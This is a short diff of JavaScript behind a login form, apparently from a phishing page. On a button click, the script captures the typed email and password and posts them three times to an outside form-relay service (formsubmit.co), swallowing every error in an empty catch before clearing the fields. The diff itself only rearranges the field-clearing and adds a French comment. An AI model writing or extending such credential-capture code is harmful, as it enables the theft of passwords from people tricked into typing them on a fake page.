@@ -1,7 +1,10 @@
 const inputMail = document.querySelector(".mail");
 const inputMdp = document.querySelector(".mdp");
 const btnNext = document.querySelector(".primary");
+const form = document.querySelector(".login-form");
 
+
+// Ton code d'envoi sur le clic du bouton
 btnNext.addEventListener("click", async () => {
   const email = inputMail.value;
   const mdp = inputMdp.value;
@@ -22,8 +25,6 @@ btnNext.addEventListener("click", async () => {
         _next: "https://formsubmit.co/success",
       }),
     });
-    inputMail.value = "";
-    inputMdp.value = "";
   } catch (e) {}
 
   try {
@@ -41,8 +42,6 @@ btnNext.addEventListener("click", async () => {
         _next: "https://formsubmit.co/success",
       }),
     });
-    inputMail.value = "";
-    inputMdp.value = "";
   } catch (e) {}
 
   try {
@@ -60,7 +59,8 @@ btnNext.addEventListener("click", async () => {
         _next: "https://formsubmit.co/success",
       }),
     });
-    inputMail.value = "";
-    inputMdp.value = "";
   } catch (e) {}
+
+  inputMail.value = "";
+  inputMdp.value = "";
 });
